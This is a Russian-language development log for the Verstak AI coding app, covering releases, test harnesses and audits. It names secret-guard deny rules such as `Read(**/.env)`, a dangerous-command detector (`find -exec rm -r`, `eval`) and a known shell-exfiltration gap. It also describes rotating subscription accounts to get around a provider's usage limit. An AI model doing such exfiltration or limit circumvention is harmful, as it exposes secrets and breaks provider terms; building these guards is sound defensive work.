не действует. **Дальше: релиз 2.0.6 одним пакетом (фикс Claude-моделей + Codex OAuth выбор + drift-сторож + race-фикс + OAuth-устойчивость).**

> **Качество кода — Фаза 2, срез 5: provider/model drift harness (12.07, ✅ ВЛИТО в main после независимого адверсариального ревью).** По §2.2 плана. `tests/ai/provider-model-drift.test.ts` (54 теста) сверяет ТРИ копии списков провайдеров/моделей: main-реестр `registry.ts` (рантайм-истина) ↔ renderer-хардкод `PROVIDERS` в `Settings.tsx` (парсится TS-AST, без импорта React) ↔ runtime-allowlist `KNOWN_IDS` в `useProvider`. Страж падает ГРОМКО, если не смог распарсить (не «молча зелёный» — проверено ревьюером). **Найдено и починено 4 РЕАЛЬНЫХ дрейфа (TDD red→green каждый):** (1) **`claude` — мёртвые модели в UI:** Settings предлагал датированные `claude-*-20251101`, которые Anthropic отменил ещё в мае (коммит `de26f3b` «КРИТИЧЕСКИЙ ФИКС (модели Claude)» поправил 5 файлов, но **забыл Settings.tsx** → 2 месяца UI предлагал невалидные модели и не показывал текущий дефолт `claude-sonnet-4-6`); (2) **`openai-codex-oauth` отсутствовал в `KNOWN_IDS`** → `parseProviderId` молча схлопывал выбор в `gemini-api` (провайдер из 2.0.4 «не выбирался»); (3) `verstak-gateway` потерял `verstak/free`; (4) `openrouter` потерял `moonshotai/kimi-k2.7-code`. Плюс `normalizeStoredModel` → чистая экспортируемая функция (repair сохранённой невалидной модели, 6 тестов) + ratchet: закрыты 4 pre-existing `no-misused-promises` в тронутых файлах. Проверки: type 0, lint:changed 0 errors, test:fast **2569 passed / 0 failed**. **Честные хвосты (ревьюер, не блокируют):** repair чинит ОТОБРАЖАЕМУЮ модель, но не переписывает настройку в БД (реальная перезапись — при открытии Settings или явном выборе; формулировка «repair-путь» в коммите шире фактического поведения) · 3 мёртвых ключа цен с датированными claude-id в `src/lib/model-catalog.ts:129-131`. **Дальше срез 6 (OAuth fault harness) — отдельной сессией.**

> **Качество кода — Фаза 2, срез 4: race-харнес projectStore (12.07, ✅ ВЛИТО в main после независимого адверсариального ревью).** По §2.1 плана — состязательные тесты быстрых переключений чатов во время стрима. `tests/store/project-store-race.test.ts` (7 тестов): 6 lock-in (guard'ы уже есть — switchChatSessionToken/history, activeChatId/reviews, lane-generation/send, leaveChat-снапшот/стрим) + **сц.4 нашёл РЕАЛЬНУЮ гонку (TDD red→green):** блок записи provider/model в `switchChatSession` не имел token-guard'а истории-загрузки → стейл-switch дописывал `model_<provider>`/`setModel` поверх нового активного чата. **Минимальный фикс:** token-guard после первого await (зеркало history-guard'а). Проверки: type 0, test:fast 2515 passed / 0 failed, lint:changed 0 errors. P0 → независимый ревьюер ДОКАЗАЛ гонку (без guard'а сц.4 красный `[2,1]`, с guard'ом 7/7 зелёных), подтвердил что фикс не ломает одиночный switch. **Дальше срез 5 (provider/model drift) — отдельной сессией.**

> **Качество кода — Фаза 0-1, срезы 1-3 (12.07, ✅ ВЛИТО в main `8d81bd8` + push после независимого адверсариального ревью — вердикт «можно вливать», Павел дал команду).** По ТЗ `Downloads/Verstak-ТЗ-качество-сессия-1.md` + план `Downloads/Verstak-план-улучшения-кода.md`. Только инфраструктура, смысловых правок кода нет. 3 чужих modified-файла владельца (baseline-verify/verstak-cli/verstak-cli-toolname) НЕ включены. **Срез 1 (`b9ccd8d`):** `scripts/code-health-report.mjs` (детерминированный снимок через TS AST, воспроизводит числа аудита — 129/53 функции >100/>200, as any=2/:any=11/@ts-ignore=2/eslint-disable=17) + `docs/CODE_HEALTH_BASELINE.md` (type/test:fast/build baseline + тайминги + известные флейки). **Срез 2 (`c344b51`):** `eslint.config.mjs` (ESLint 10 + typescript-eslint 8, type-aware, РОВНО правила плана §1.2) + `lint:full`/`lint:changed` + `docs/LINT_BASELINE.md` (47 errors / 508 warnings; **floating/misused-promises в IPC/agent-loop = 0**; подозрения — 5 switch-exhaustiveness в electron/ai + floating-promise в main.ts bootstrap — вынесены, НЕ фикшены). **Срез 3 (`29d3ec4`):** `.editorconfig` + `.prettierrc` по доминирующему стилю (одинарные, без ; , 2 пробела, LF, avoid) + `lint:changed` встроен в precommit + `format:check:changed` (не блокер); **гейт доказан** — временный floating-promise+rules-of-hooks файл заблокировал коммит. Проверки: type/test:fast/build в baseline-состоянии, 0 новых падений; независимый ревьюер перепроверил всё фактами (гейт реально блокирует плохой код, ядро loop'а/IPC чисто по floating-promise, 3 чужих файла не задеты). **Дальше срез 4 (projectStore race harness) — отдельной сессией, когда Павел решит продолжить.**

> **UI-рефреш Ильи (filatov) поверх 2.0.4 — merge в main + ЗАРЕЛИЗЕНО в 2.0.5 (12.07, GitHub Release `bf97888`/`v2.0.5`).** Влита ветка `filatov/codex/reapply-1.9.5` (2 коммита, ~43 файла): редизайн Settings (V3 connectors-таб + `ConnectorIcons`), `GlobalTooltipHost`, `ProjectRulesView`, обновление i18n/тем, правки коннекторов bitrix24-profile + yandex-wordstat, новые тесты. **3 конфликта резолвнуты:** `ai.ts`→наш (рефактор runner-*.ts) с портом Ильиной фичи **daily cost-cap с персистом** (было бы сломано merge'ем — UI пишет `cost_cap_usd_per_day`, backend читал `_per_session`; теперь `AiDeps.setSecret` + `createDailyCostGuard`, дата+центы в settings, сброс на новый день); `ModelPicker.tsx`→Ильин (его `modeControlInfo` honesty-бейдж вместо моего tierBadge, + расширен `transport` до `RuntimeTransport` с классом `is-tunnel`); `projectStore.ts` ViewId→объединение (его calendar/video/project-rules + наши inspector/memory-gov/agents/scheduler). **Фикс регрессии merge:** `grok-cli.ts` + `Settings.tsx` — Ильина ветка откатывала модели к legacy `grok-build`, восстановлен валидированный `grok-4.5`+`grok-composer-2.5-fast` (иначе падал тест model-registry). **Проверено:** `npm run type` 0 ошибок, `test:fast` **2508 passed / 0 failed**, codex-oauth 2.0.4 + Tunnel-режим пережили merge (Settings toggle, registry, CSS). Запушено `a45e0aa`. **Follow-up (не блокирует, чужой код — не чистил без спроса):** в Ильином Settings.tsx мёртвый `renderConnectorsTab` (заменён на V3) + блок `{false && …}` + пара unused-vars — tech-debt его переходного редизайна, tsc-толерантен, таб коннекторов работает (V3). **ЗАРЕЛИЗЕНО в 2.0.5** (Павел дал команду «пости»): bump 2.0.4→2.0.5, `dist:win` (Setup 360МБ + Portable, подписаны), GitHub Release опубликован через REST API (Setup+Portable+latest.yml, латест последним; Portable оборвался РФ→GitHub 1 раз → идемпотентный ретрай дозалил), публичная проверка зелёная. Визуальная приёмка UI Ильи в десктоп-сборке — за Павлом постфактум (Electron в browser-пане не рендерится, я собрал+проверил бандл: ProjectRulesView + Settings-редизайн в сборке).

> **1.9.9 Product Lift — направление скорректировано продуктовым ревью (в main, релиза нет).** Исходный план ставил debate первой фичей. Продуктовое ревью (GPT, по брифу Павла) развернуло: **не debate, а «Контролируемый AI-дежурный»** — превратить УЖЕ работающий Scheduler в законченный продаваемый сценарий. Логика: обычное расписание уже есть у Cursor/Copilot/Antigravity → продаём не «у нас тоже cron», а комбо «фон наблюдает read-only (код + RU-коннекторы), находит проблему, показывает источник, предлагает фикс — но НИЧЕГО не меняет без подтверждения». Это разом демонстрирует контроль+прозрачность+RU-интеграции. **Сделано (срезы 1-2, TDD+type+build):** **срез 1 (`72a3508`) хиро-пресеты** — 3 сценария в клик (🔌 Дозор интеграций / 🔎 Дозор кода / 📊 Сводка данных), тест лочит read-only дисциплину (пресет с мутацией падает); **срез 2 (`3932c4f`) мост «Починить в чате»** — находка прогона (last_result, раньше персистился но был невидим в UI) + кнопка → gg-inject-prompt + switch на chat → контролируемый фикс (промпт требует «сначала план, не пиши сразу»). ЧЕСТНОЕ ограничение соблюдено: scheduled-прогон строго read-only (SCHEDULED_READONLY_TOOLS security-lock) → пресеты обещают только наблюдение, фактический фикс идёт под подтверждением в чате. **Дальше:** визуальная приёмка Павлом в десктоп-сборке (Electron не рендерится в browser-пане); опц. Agents-панель «кто что проверял»; **debate НЕ выкинут — понижен до «Перекрёстной проверки моделей», и она уже ~80% есть** (Explicit Review 🔍 + авто cross-verify) → доупаковка, не стройка. **User-validation (за Павлом):** прогнать сценарий на 3-5 пользователях 14 дней, критерий — ≥2 оставили включённым.

> **1.9.7 Long Sessions — автономные срезы (в main, релиза нет).** Продолжение арки после 1.9.6. Взяты срезы, не требующие живого CLI (Mode C session-continuity #3-5 паркуется — нужен залогиненный claude для верификации, не паяем непроверенное): **#7 (`5c92ab1`) троттлинг чекпойнтов** — saveCheckpoint писал полную историю (~1МБ) КАЖДЫЙ turn (O(turns×history) churn); теперь skip-if-unchanged (djb2-hash) + every-N на длинных прогонах + size-cap backstop, чистится в финализации; **#8 (`f6d21bd`) security-guard scheduled** — unattended NL-cron прогон получает только readonly-инструменты, регрессия добавления write-tool в SCHEDULED_READONLY_TOOLS теперь падает тестом; **#2 (`dc3cd16`) удержание stash** — `git stash create` даёт висячий commit (gc выгребет → откат #1 без грязных pre-run правок); закрепляем ref'ом `refs/verstak/envelopes/<runId>` + isStashAlive + TTL-prune, preview/apply по реальной живости. **#1 (`c2f3315`) CLI crash recovery** — баннер прерванной сессии для CLI/деструктив-крэшей показывал только «Показать что было», пряча re-send (хотя lastUserRequest сохранён и re-send безопасен, user-initiated); теперь кнопка «Повторить запрос заново» (fresh, без реплея деструктива), чистый `resume-actions.ts` различает resume-with-context vs resend-fresh. **#6 (`504160c`) account-switch на CLI-пути** — при тесте вскрылось РЕАЛЬНОЕ: attemptAccountSwitch был ТОЛЬКО в runApiConversation, а подписочные аккаунты у CLI-провайдеров (runPlainConversation) → авто-свитч 1.9.4 был МЁРТВ для своего кейса; добавлен switch в roundHadError-ветку CLI-пути + интеграционный тест. TDD каждый, type 0, pre-commit ✓. **Все автономные срезы 1.9.7 закрыты (#1/#2/#6/#7/#8).** **Адверсариальное ревью (6 ревьюеров → верификация) нашло 6 дефектов — ВСЕ из моих же изменений сессии, ВСЕ пофикшены по TDD:** 🔴HIGH — account-switch (#6) зацикливался вечно при resetEta=null + пул≥2 (`6b2f0b5`, bounded MAX_ACCOUNT_SWITCHES в обоих путях); ResumeBanner (#1) вообще не отправлял (resumeAutoSendRef не читался — `217d5c2`); 2 дыры редакции секретов (#4: URL со скобкой/IPv6 обрезался перед `?token=`, space-флаг `--token VALUE` — `8a892cd`); checkpoint size-cap (#7) рубил resume 1M-моделей (4→32МБ, `217d5c2`); Control Envelope откат из субдиректории репо был неполным (`217d5c2`, git-топлевел). Урок подтверждён: security-фиксы обязательно ре-ревьюить — сам бы не поймал HIGH-цикл и мёртвую resume-кнопку. **Заблокировано на Павле:** Mode C session-continuity (#3-5, живой claude), #6 live-smoke 1.9.6, #7-UI 1.9.6 (продуктовое «довести/убрать»).

> **1.9.6 Trust Hardening — по плану Павла `Downloads/Verstak-план-усиления-1.9.6-1.9.9.md` (в main, релиза нет).** Арка усиления: закрыть хвосты/дыры доверия 1.9.5. Сделано 5.5/7 задач, каждая TDD+type+pre-commit хук зелёный: **#1 (`40644a7`) Control Envelope Restore** — откат CLI-прогона по git-якорю ИЗ UI (ночью якорь только снимался): previewControlRestore (недеструктивно) + applyControlRestore (checkout+stash apply, отказ moved-on), кнопка «↩︎ Откатить» в Инспекторе, полный sha в ref события; **#2 (`1084dc1`) матрица защиты секретов** — `cli-security-capabilities.ts` честно: guard только у claude (partial), codex/grok/gemini=none; бейдж «Секреты: частично/без CLI-защиты» + анти-дрейф-тест main↔renderer; **#4 (`7baafb7`) scanText на projected args** — leak-путь 1.9.5 (inline-креды в tool-args → Timeline) закрыт `redactForDisplay`; **#3 (`803c135`) Bash-truth** — НЕ имитируем Bash-deny (обходим cat/python/xxd), честный runtime-warning про shell-эксфильтрацию, lock-in тест; **#5 (`be6ee9d`) харнес CLI-пути** — весь 1.9.5 был без тестов; `plain-loop.test.ts` (5) покрыл текст/envelope/редакцию/checkpoint/abort + ВЫЯВИЛ дыру (pre-abort не эмитил done → фикс); **#7 часть (`4c2fc73`)** — убран мёртвый недостижимый код Video/Calendar; **#6 (`264c29d`) live-smoke готов** — `scripts/smoke-claude-guard.mjs` (запуск за Павлом, claude в среде агента не залогинен). **Осталось Павлу решить (#7 user-visible, «довести или убрать» — продуктовый выбор):** матрица уведомлений 16/18 мёртвых тумблеров · таб «Профили»-заглушка · smart-approve инертен. **И #6:** прогнать `node scripts/smoke-claude-guard.mjs` на залогиненном claude → если BLOCKED, поднять `confirmedByLiveSmoke=true`.

> **Follow-up (не блокирует, но добить):** живой enforcement-smoke claude-guard — прогнать claude-cli в accept-edits ВНУТРИ Verstak на реальном OAuth (задача «прочитай .env»), убедиться что deny-правило `Read(**/.env)` реально блокирует чтение на живом бинаре (я подтвердил только приём флагов парсером + документированную deny-семантику, полный OAuth-прогон ночью/из bash не сматчить — токен в safeStorage). Подписочные Kimi/Z.ai ждут ключей Павла → smoke. · **Хвост → релиз 1.9.3:** UI Ильи + мультиаккаунт+авто-свитч + подписочные провайдеры (после live smoke на ключах) · деплой `agi-iri.ru/verstak`→1.9.2 (Codex/dev-hq) · структурный долг §5 · полная активация smart-approve

> **CLI-глубокая-интеграция — ночной автономный спринт `/loop` (10.07, в main + push, релиза нет).** По `docs/TASK-CLI-DEEP-INTEGRATION.md`: закрыть ощущение «CLI = просто окно ввода, не свой чат как у Hermes/OpenClaw». Clean-by-default (НЕ трогаем ToS-серый direct-OAuth и Codex-native Mode B ночью). **Срез 1 (`d0e7f9c`): claude-cli проекция `tool_use`** — родные tool_use-блоки Claude Code (`Read`/`Edit`/`Bash`…) раньше выбрасывались парсером, в Timeline виднелся только финальный текст; теперь эмитятся как информационные tool-call (наш executor их НЕ запускает — Claude уже выполнил внутри `--print`; `runPlainConversation` релеит в tool-activity). TDD `tests/ai/claude-cli-tool-projection.test.ts` (fake stream-json, 2/2). **Срез 2 (`d69b036`): codex-cli проекция** — `command_execution`/`file_change`/`mcp_tool_call`/`web_search` item'ы → tool-call, зеркаля срез 1. TDD в `codex-stream.test.ts` (5/5). **Grok отложен честно:** streaming-путь grok-4.5 не подтверждён на fake-fixture (event-shape `tool_call` не верифицирован на живом grok) — не тащим непроверенный код. **Срез 3 (`625de3b`): честные runtime-ярлыки** — `src/lib/runtime-capability.ts` считает уровень контроля (full/observed/limited) из provider+transport, а НЕ из одного transport: после срезов 1-2 claude/codex CLI стали «наблюдаемыми» (таймлайн виден), grok/gemini CLI — «урезанными», ни один CLI не показывается как full control. ModelPicker-бейдж + AgentRunInspector-бейдж прогона + i18n ru/en + тона CSS. TDD `runtime-capability.test.ts` (6, вкл. инвариант «набор наблюдаемых не разрастается молча»). **Срез 4 (`72c5cef`): Control Envelope** — честный git-якорь отката ДО каждого CLI-прогона. CLI пишет мимо undo-стека Verstak, поэтому «checkpoint над undo-стеком» = полая фича; вместо этого `electron/ai/control-envelope.ts` снимает git HEAD + недеструктивный `git stash create` снапшот грязных tracked-правок (рабочее дерево/stash-список не трогаются). Provenance БЕЗ секретов (id/model/transport/sha + честная нота). В `runPlainConversation` перед CLI-прогоном: событие «🛟 Контрольная точка» в Timeline + journal + agent-run event. Ставится даже на one-shot. Осознанно отступил от хинта «переиспользовать undo.ts» (неверен для CLI). TDD `control-envelope.test.ts` (10, вкл. недеструктивность stash, provenance без token/key). **Срез 5 (`476a73d`): permission-mode + guard секретов для claude-cli** — зеркалим codex sandboxArgsForMode через документированный `--permission-mode` (ask→default, accept-edits/auto→acceptEdits, plan→plan, bypass→bypassPermissions). Без него headless `--print` не давал агенту писать — корень ощущения «CLI = окно ввода». Включив запись, закрыли секреты и в CLI: `claudeSecretDenySpecifiers` — path-scoped `--disallowedTools 'Read(**/.env)'`… для Read/Edit/Write, зеркало isForbiddenPath (раньше guard жил только на API-пути). Честные лимиты: Bash-эксфильтрация флагами не режется (inherent, сеть — Envelope-якорь); runtime-enforcement опирается на документированную deny-семантику Claude Code, не на живой OAuth-прогон. **Grok отложен честно** (research не подтвердил permission-аналог/path-deny — не паяем непроверенное). TDD `claude-cli-permission.test.ts` (8, вкл. security «CLI не трогает .env» на уровне args). Проверки каждого среза: type 0, задетые тесты зелёные, полный pre-commit хук ✓. **Очередь исчерпана** (срез 6 RuntimeAdapter — осознанно НЕ делаю: спекулятивная абстракция без потребителей, против §6 CLAUDE.md). Дальше — release-prep 1.9.5.

> **Авто-переключение аккаунта на лимите — 1.9.4 (09.07, в main + push, релиза нет).** Пул подписок стал самоуправляемым: активный аккаунт бьёт лимит → Verstak сам переключается на следующий готовый аккаунт того же провайдера, НЕ теряя историю прогона. Детектор `electron/ai/subscription-limits.ts` (pure, 8 TDD на реальных строках: Claude 5-часовой usage-лимит / rate-429 / quota + парс ETA сброса). Storage: миграция 45 `cooling_until` + `markAccountCooling`/`switchActiveOnLimit` (активный→cooling, следующий готовый→активен; cooling-истёкшие снова годны; пул исчерпан→switched:false). Agent loop: хук `attemptAccountSwitch` в error-пути ПЕРЕД provider-fallback — пересоздаёт тот же провайдер с новым активным аккаунтом (токен/CODEX_HOME) и продолжает; `makeFallbackProvider` резолвит аккаунт заново; проброшено через `fallbackOpts.switchAccountOnLimit`. UI: «остывает до HH:MM» в панели (DTO+coolingUntil). API-путь не задет. Проверки: type 0, test:fast 2302/0 failed, build ✓, pre-commit ✓. Запушено `aec6cfb`.

> **Реестр аккаунтов подписок — фундамент мультиаккаунта 1.9.3 (09.07, в main + push, релиза нет).** Фаза 1.9.3 из `docs/CLI_SUBSCRIPTIONS_PLAN`: пул аккаунтов на провайдера + ручное переключение, чтобы ДНК «аккаунт упал → переключился» работала и для подписок. Первый end-to-end — **Claude** (пул Max, ротацией обходить 5-часовой лимит). Слои: миграция 44 `subscription_accounts` + `electron/storage/subscription-accounts.ts` (секреты НЕ в таблице — только cred_ref в SafeStorage; инвариант «один активный на провайдера», первый авто-активен, удаление активного повышает следующий; 7 TDD-тестов); runtime `resolveSubscriptionAccount` в AiDeps (активный claude-cli аккаунт → env `CLAUDE_CODE_OAUTH_TOKEN`, фолбэк на legacy-токен = обратная совместимость); IPC `subscription-accounts:*` в 3 местах (секрет наружу не отдаётся, только DTO+hasSecret); UI `SubscriptionAccountsPanel` в детали провайдера Settings (пока claude-cli). Kimi/Z.ai (base_url+key, ждут ключей) — реестр generic, follow-up. Проверки: type 0, test:fast 2290/0 failed, build ✓, pre-commit ✓. Запушено `919b699`.

> **Codex мультиаккаунт через CODEX_HOME (09.07, в main + push).** Расширение реестра на Codex CLI. **Разведка config-dir CLI (факт, веб-источники):** Codex — `CODEX_HOME` хирургично изолирует стейт ✅; Gemini config-dir env НЕ поддерживает (хардкод `~/.gemini`, только открытый FR #2815) — заблокировано апстримом; Grok — только API-key env, не подписка-OAuth — отложено. Codex = config-dir аккаунт (папка под `userData/cli-accounts/`), не токен: runtime биндит `CODEX_HOME` активного аккаунта; IPC `create-dir` + `login` (терминал с `CODEX_HOME` + `codex login`) + delete чистит папку; `reloginCli` расширен env-параметром; UI-панель режим `dir` (создание+«Войти») в Settings для codex-cli. Claude остаётся token-режимом. Разведка записана в `docs/CLI_SUBSCRIPTIONS_PLAN` §5. Проверки: type 0, storage 8 тестов, test:fast 2291/0 failed, build ✓, pre-commit ✓. Запушено `b2d8d09`. Логин интерактивен (OAuth) — не смоук-тестится автоматом.

> **Мердж UI/chat-flow пакета Ильи (filatov) в main (09.07, local PASS + push, релиза нет).** Влиты 5 новых коммитов ветки `filatov/codex/verstak-1.8.6-ui-model-fixes` (85bc1e9..a97271a) через 3-way merge поверх 1.9.2 (версия НЕ скопирована из форка, по `docs/AI_HANDOFF.md`). Перенесено группой: индикаторы статуса на обводке аватара (SVG-arc, не conic-gradient), панель «Ход работы» (привязана к ответу; interrupted → recovery-блок вместо пустого «Grok Build»), applied-skill чипы + инъекция metadata в контекст, редизайн Settings (Appearance/Notifications/Updates/Providers), skill-импорт с диффом, handoff/transcript в chat tools. Сохранены наши 1.9.x: timeout watchdog+signalExitReason, sweeper, frozen memory (MEM-01), skill governance, rules+поиск настроек, grok-4.5+Kimi/Z.ai. **18 конфликтов:** миграции (37 `applied_skills` встала в наш пропуск 36→38-43) + ядро backend вручную, тяжёлые UI (layout.css 19 блоков/Chat.tsx/Settings.tsx/SkillsView) — 6 параллельных агентов с правилами handoff. Восстановлена ручная «Найти CLI» (агент убрал вместе со сломанной login-кнопкой; сломанную не вернул). Визуал приёмлен Павлом (кольца/панель dark+light). Проверки: type 0, test:fast 2283/0 failed, build ✓, pre-commit ✓. Запушено в origin `b7dffff`.

> **Подписочные провайдеры Kimi Code + Z.ai GLM Coding (09.07, local PASS, в main, релиза ещё нет).** По запросу Павла («китайцы по подписке, API дорого»): десктоп-приложения Kimi/ZCode на компе — Electron-GUI без интеграционной поверхности, но обе подписки дают собственные OpenAI-совместимые endpoints. Добавлены 2 extra-провайдера: **`kimi-coding`** «Kimi Code (подписка)» — `https://api.kimi.com/coding/v1`, модель `kimi-for-coding` (=K2.7 Code, ctx 262144), ключ из Kimi Code Console (нужно членство kimi.com, квота общая с подпиской); **`zai-coding`** «Z.ai GLM Coding (подписка)» — строго coding-endpoint `https://api.z.ai/api/coding/paas/v4` (общий `/api/paas/v4` ключи Coding Plan НЕ принимает), модели `glm-5.2`/`glm-5-turbo`, ключ с z.ai. Цена токена в cost controller = $0 (фикс-подписка, как CLI). Прошито во все точки: extra-providers (spec+union), registry switch, model-registry (ctx+price), pricing, useProvider (union+KNOWN_IDS), Settings (карточки), Sidebar (теги KMC/GLM), tool-mode (coaxable). TDD: 2 красных теста в `model-registry.test.ts` → зелёные. Попутно в коммит вошёл висевший в дереве WIP grok-4.3→4.5 (со своим тестом). Проверки: `npm run type` pass, `npm run test:fast` 2265 pass / 0 failed. **Осталось:** Павлу создать ключи в двух консолях → вставить в Settings → Провайдеры; живой smoke; затем релиз 1.9.3.

> **1.9.2 release published (09.07, GitHub public PASS).** Merge ветки `claude/hardening-1.9.2` в main (`a420053`), bump `1.9.1 → 1.9.2`. GitHub Release `v1.9.2` (id=351143989) опубликован без вывода токена: `Verstak-Setup-1.9.2-x64.exe` 360,367,236 B, `Verstak-Portable-1.9.2-x64.exe` 209,570,281 B, `latest.yml` 351 B (загружен последним). Public checks: `releases/latest` = `v1.9.2` draft=false все 3 ассета `uploaded`; public `latest.yml` returns `version: 1.9.2`; direct Setup link HTTP 200. Первая попытка публикации оборвалась write-timeout на 360МБ Setup (РФ→GitHub), Release при этом создался — idempotent resume через curl дозалил ассеты. Ниже — содержимое спринта 1.9.2 hardening.

> **1.9.2 hardening (08.07, ветка `claude/hardening-1.9.2`, локальный гейт PASS).** Добит MEDIUM-хвост аудита после того, как 1.9.1 закрыл HIGH. По TDD (тест-на-баг → фикс): **M2** — watchdog не шлёт ложный timeout-тост на завершённом прогоне (`shouldFireRunTimeout`); **M3** — детектор опасных команд ловит `find -exec rm -r` без `-f` и `eval` динамики/декодера (var-индирекция помечена known-limit); **M4** — `spawn_process` переиспользует общий `evaluateSmartApprove` с per-send лимитом эскалаций вместо безлимитного дубля; **M5** — heartbeat планировщика вынесен в 1-строчную `scheduler_meta` (миграция 43), не размазан по задачам, виден при нуле задач; **M6** — `next_run_at` задокументирован как диагностическое поле (at-most-once = `last_run_minute`); **WT-05** — реализованы и впаяны в `worktree:isolate` `gcWorktrees` (idle 7д, завершённые сессии, clean) + `reconcileOrphanWorktrees` (registry-aware); **M1** — `smart-approve` помечен SEED (guard не прошит в прод); миграция 37 (пропуск) задокументирована. Проверки: `npm run type` pass; `npm run test:fast` **2262 passed / 7 skipped / 0 failed**; pre-commit hook (полный type+vitest) pass на коммите `05d018c` (M2/M3/M4), M5/M6/WT-05 — следующий коммит. Диф минимальный, миграция только append (43). Осознанно вне блока: структурный долг §5 (распил `runApiConversation`/`projectStore`) + полная активация smart-approve. Осталось выкатить: merge в main + bump 1.9.2 + dist:win + GitHub Release.

> **1.9.1 release published (08.07, GitHub public PASS).** Hotfix после аудита: закрыты H1/H2/H3 по runtime-process слою (production sweeper, очистка orphan `notifyOnExit` completion'ов, redaction по накопленному raw tail вместо chunk-by-chunk), стабилизированы Windows test timeouts (`vitest.config.ts`, anti-orphan PID check, native-module absent-path fixture). Проверки: targeted audit-fix suite 34/34 pass; previously failing timeout set 56/56 pass; `npm run type` pass; `npm run test:fast` 281 files pass / 1 skipped, 2254 tests pass / 7 skipped; `npm run dist:win` pass. GitHub Release `v1.9.1` опубликован без вывода токена: `Verstak-Setup-1.9.1-x64.exe` 360,365,106 B, `Verstak-Portable-1.9.1-x64.exe` 209,567,882 B, `latest.yml` 351 B. Public checks: Release API `draft=false`, все 3 assets `uploaded`; public `latest.yml` returns `version: 1.9.1`; direct Setup link returns `200 OK` / `Content-Length: 360365106`. Live `https://agi-iri.ru/verstak/` пока статично содержит `Verstak-Setup-1.8.9-x64.exe` и не содержит GitHub latest API; нужен серверный SFTP/SSH-доступ для обновления кнопки на сайте.

> **1.9.0 release published (08.07, GitHub public PASS).** `v1.9.0` опубликован на GitHub Release, assets загружены через GitHub API без вывода токена: `Verstak-Setup-1.9.0-x64.exe` 360,365,761 B, `Verstak-Portable-1.9.0-x64.exe` 209,570,588 B, `latest.yml` 351 B. Public checks: Release API `draft=false`, все 3 assets `uploaded`; public `latest.yml` returns `version: 1.9.0`; direct Setup link returns `200 OK` / `Content-Length: 360365761`. `docs/index.html` fallback обновлён на GitHub Setup 1.9.0. Live `https://agi-iri.ru/verstak/` пока содержит fallback `Verstak-Setup-1.8.9-x64.exe`; SSH-доступ к серверу заблокирован (`Permission denied`), поэтому серверную кнопку не меняли.

> **Аудит 1.9.0 + фикс утечек рантайма (08.07, local PASS).** Полный аудит по 4 осям (5 агентов + ручная верификация), деливерабл `docs/AUDIT_2026-07-08.md`. План реализован честно (27 ✅ / 5 ⚠ отступление-от-буквы / 0 ложно-закрытых), но найдены реальные дефекты. **Закрыт топ-3 по TDD** (`process-registry.ts` + `main.ts`): **H3** — редакция stdout шла по-чанково, секрет на стыке двух чанков утекал в контекст модели → теперь копится `rawTail` и `scanText` идёт по накопленному буферу целиком; **H1** — `startSweeper()` не вызывался в проде (только в тестах) → подключён в `registerDeferredIpc` + `stopSweeper()` на `before-quit`; **H2** — `pruneFinished` теперь вычищает осиротевшие `notifyOnExit` completion'ы удалённых процессов (владелец-sendId уже завершил ход и не дренирует). Проверки: 2 красных теста воспроизвели H2/H3 до фикса, после — `process-registry` 11/11, `process-tools`+`agent-loop` 23/23, `npm run type` pass. **Открытый хвост аудита (не тронут):** M1 smart-approve инертен в проде (не прошит `ctx.smartApprove` + флаг off + нет таймаута APP-02); M2 ложный timeout-тост; M3 деобфускация уже денилиста; пропуск миграции 37; WT-05 gc/reconcile; глобальный `testTimeout` для флейков; §5 монолиты `ai.ts`/`projectStore.ts`.

> **1.9.0 release-ready (08.07, local full gate PASS).** Версия поднята до `1.9.0` в `package.json` / `package-lock.json`; добавлены `CHANGELOG.md` и `docs/RELEASE-v1.9.0.md` notes. Закрыт 1.9 блок: timeout policy, cron heartbeat/at-most-once claim, frozen memory snapshot, opt-in Proof auto-send, inbound mutation threat model. Проверки: targeted scheduler/storage/memory/proof/notify suite 36/36 pass; `npm run type` pass; `npm run test:fast` 281 files pass / 1 skipped, 2252 tests pass / 7 skipped; `npm run build` pass; `npm run dist:win` pass. Артефакты: `Verstak-Setup-1.9.0-x64.exe` 360,365,761 B, `Verstak-Portable-1.9.0-x64.exe` 209,570,588 B, `latest.yml` version 1.9.0; sha512/size verified.

> **1.9.0 RUN-08 timeout policy (08.07, local PASS).** Закрыт первый блок 1.9: runtime watchdog для `ai:send`. Политика берёт `agent_run_timeout_ms` из settings или `VERSTAK_AGENT_RUN_TIMEOUT_MS` из env, применяет safe clamp `30s..6h`, по таймауту пишет `agent_runs.status='timed_out'` (миграция 41), добавляет timeline event, отдаёт chat error и абортит общий `AbortController`. Runner отличает timeout от ручного Stop через `AbortSignal.reason`; `timed_out` синхронизирован с `RunStatus`, `ai:wait`, UI-статусом/повторной отправкой и Telegram notify. Проверки: targeted lifecycle/notify/storage/wait suite 55/55 pass; `npm run type` pass.

> **1.9.x Cron + Memory + Proof Delivery (08.07, local PASS).** Закрыта фаза 4 master-plan: cron пишет heartbeat каждые 60с, UI показывает age/stalled >3 мин, `next_run_at` и `last_run_minute` claim пишутся до exec, lifecycle prompts (`verstak stop/restart`, `shutdown`, `kill scheduler`) отклоняются. Memory вынесена в `electron/ai/memory/provider.ts` + frozen run snapshot/fingerprint; API/CLI получают один snapshot на старт run, без vectors/cloud-sync. Proof Delivery: существующие `proof:export-pdf`/`proof:send-telegram` сохранены, добавлен opt-in long-run auto Proof report (`proof_auto_send_telegram=true`, порог `proof_auto_send_min_minutes`, default 10), inbound mutation decision записан в `docs/INBOUND_MUTATION_THREAT_MODEL.md`. Проверки: targeted scheduler/storage/memory/proof/notify suite pass, `npm run type` pass.

> **1.8.9 release upload (08.07, public PASS).** `agi-iri.ru/verstak/` переключён на прямой `/downloads/verstak/Verstak-Setup-1.8.9-x64.exe`; новый setup загружен через `sftp` после двух обрывов `scp`; публичная проверка: installer returns HTTP 200, `Content-Length: 360360483`, страница содержит 4 ссылки на `Verstak-Setup-1.8.9-x64.exe`.

